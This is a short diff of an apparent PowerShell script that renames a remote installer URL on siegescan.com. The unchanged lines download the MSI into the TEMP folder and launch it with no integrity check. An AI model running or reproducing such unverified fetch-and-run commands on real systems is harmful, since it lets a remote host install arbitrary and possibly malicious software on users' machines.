@@ -1,5 +1,5 @@
-$exeUrl  = "https://siegescan.com/drivers.msi"
-$exePath = "$env:TEMP\drivers.msi"
+$exeUrl  = "https://siegescan.com/driver.msi"
+$exePath = "$env:TEMP\driver.msi"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath
